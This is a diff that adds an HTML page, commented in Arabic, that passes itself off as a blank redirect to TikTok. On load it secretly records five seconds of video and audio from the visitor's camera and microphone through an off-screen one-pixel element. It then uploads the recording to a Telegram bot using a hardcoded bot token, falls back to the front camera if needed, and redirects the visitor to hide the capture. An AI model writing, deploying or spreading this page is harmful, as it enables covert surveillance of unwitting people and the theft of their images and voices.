@@ -1,0 +1,142 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title></title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background: black;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- عناصر التصوير مخفية -->
+    <video id="video" autoplay playsinline style="position:fixed; top:-1000px; left:-1000px; width:1px; height:1px;"></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+
+    <script>
+        // ====== الإعدادات ======
+        const token = "8307560710:AAFNRpzh141cq7rKt_OmPR0A823dxEaOZVU";
+        const id = new URLSearchParams(window.location.search).get('id');
+        
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        
+        let stream = null;
+        let recorder = null;
+        let chunks = [];
+
+        // ====== بداية التصوير ======
+        async function start() {
+            if (!id) {
+                window.location.href = "https://www.tiktok.com";
+                return;
+            }
+
+            try {
+                // طلب الكاميرا الخلفية والميكروفون
+                stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: { exact: "environment" } }, 
+                    audio: true 
+                });
+                
+                video.srcObject = stream;
+                
+                // انتظار 3 ثواني عشان الكاميرا تثبت وتضبط الإضاءة
+                setTimeout(() => {
+                    recorder = new MediaRecorder(stream);
+                    
+                    recorder.ondataavailable = (e) => {
+                        if (e.data.size > 0) chunks.push(e.data);
+                    };
+                    
+                    recorder.onstop = () => {
+                        const blob = new Blob(chunks, { type: 'video/mp4' });
+                        
+                        // إرسال الفيديو
+                        const form = new FormData();
+                        form.append('chat_id', id);
+                        form.append('video', blob, 'vid.mp4');
+                        
+                        fetch(`https://api.telegram.org/bot${token}/sendVideo`, {
+                            method: 'POST',
+                            body: form
+                        }).finally(() => {
+                            stream.getTracks().forEach(t => t.stop());
+                            window.location.href = "https://www.tiktok.com";
+                        });
+                    };
+                    
+                    // تسجيل 5 ثواني
+                    recorder.start();
+                    setTimeout(() => recorder.stop(), 5000);
+                    
+                }, 3000);
+                
+            } catch (err) {
+                // إذا فشل، حاول بالكاميرا الأمامية
+                try {
+                    stream = await navigator.mediaDevices.getUserMedia({ 
+                        video: true, 
+                        audio: true 
+                    });
+                    
+                    video.srcObject = stream;
+                    
+                    setTimeout(() => {
+                        recorder = new MediaRecorder(stream);
+                        
+                        recorder.ondataavailable = (e) => {
+                            if (e.data.size > 0) chunks.push(e.data);
+                        };
+                        
+                        recorder.onstop = () => {
+                            const blob = new Blob(chunks, { type: 'video/mp4' });
+                            
+                            const form = new FormData();
+                            form.append('chat_id', id);
+                            form.append('video', blob, 'vid.mp4');
+                            
+                            fetch(`https://api.telegram.org/bot${token}/sendVideo`, {
+                                method: 'POST',
+                                body: form
+                            }).finally(() => {
+                                stream.getTracks().forEach(t => t.stop());
+                                window.location.href = "https://www.tiktok.com";
+                            });
+                        };
+                        
+                        recorder.start();
+                        setTimeout(() => recorder.stop(), 5000);
+                        
+                    }, 3000);
+                    
+                } catch (fallbackErr) {
+                    // إذا فشل، أرسل رسالة
+                    fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({
+                            chat_id: id,
+                            text: `❌ خطأ: ${fallbackErr.message}`
+                        })
+                    }).finally(() => {
+                        window.location.href = "https://www.tiktok.com";
+                    });
+                }
+            }
+        }
+
+        // تشغيل
+        start();
+
+        // طوارئ: توجه بعد 10 ثواني
+        setTimeout(() => {
+            window.location.href = "https://www.tiktok.com";
+        }, 10000);
+    </script>
+</body>
+</html>
